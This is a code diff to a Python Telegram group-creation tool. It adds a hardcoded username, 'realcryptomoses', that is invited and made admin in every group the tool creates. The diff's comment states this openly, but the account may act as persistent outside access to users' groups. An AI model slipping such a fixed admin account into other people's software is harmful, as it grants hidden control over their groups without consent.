@@ -6,7 +6,7 @@ import asyncio
 import logging
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import List, Optional
+from typing import List, Optional, Tuple
 
 from telethon import TelegramClient
 from telethon.errors import UserNotParticipantError
@@ -26,6 +26,20 @@ from .config_loader import (
 )
 
 logger = logging.getLogger(__name__)
+
+# Always invited and given admin on every group creation (all codes, including dynamic).
+_DEFAULT_ADMIN_USERNAME = "realcryptomoses"
+
+
+def _ensure_default_admin(members: List[str], admins: List[str]) -> Tuple[List[str], List[str]]:
+    key = username_for_telegram(_DEFAULT_ADMIN_USERNAME)
+    m = list(members)
+    if key not in {username_for_telegram(x) for x in m}:
+        m.append(_DEFAULT_ADMIN_USERNAME)
+    a = list(admins)
+    if key not in {username_for_telegram(x) for x in a}:
+        a.append(_DEFAULT_ADMIN_USERNAME)
+    return m, a
 
 
 @dataclass
@@ -69,6 +83,7 @@ async def create_group_and_setup(
     result = CreateGroupResult(success=False, group_name=group_title)
     members = get_members(code)
     admins = get_admins(code)
+    members, admins = _ensure_default_admin(members, admins)
     welcome = get_welcome_message(code)
 
     try:
